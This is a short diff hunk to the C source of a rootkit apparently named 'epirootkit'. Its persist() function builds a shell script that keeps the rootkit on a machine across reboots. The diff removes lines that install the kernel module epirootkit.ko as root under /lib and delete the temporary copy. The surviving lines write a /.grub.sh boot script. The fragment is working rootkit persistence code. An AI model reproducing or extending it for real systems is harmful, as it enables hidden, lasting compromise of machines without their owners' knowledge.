@@ -13,9 +13,6 @@ int persist(void) {
     int ret;
     char *script_content =
         "#!/bin/sh\n"
-        "mkdir -p /lib/epirootkit/\n"
-        "install -o root -m 0644 /tmp/epirootkit.ko /lib/epirootkit/epirootkit.ko\n"
-        "rm -f /tmp/epirootkit.ko\n"
         "\n"
         "cat > /.grub.sh <<'EOF'\n"
         "#!/bin/sh\n"
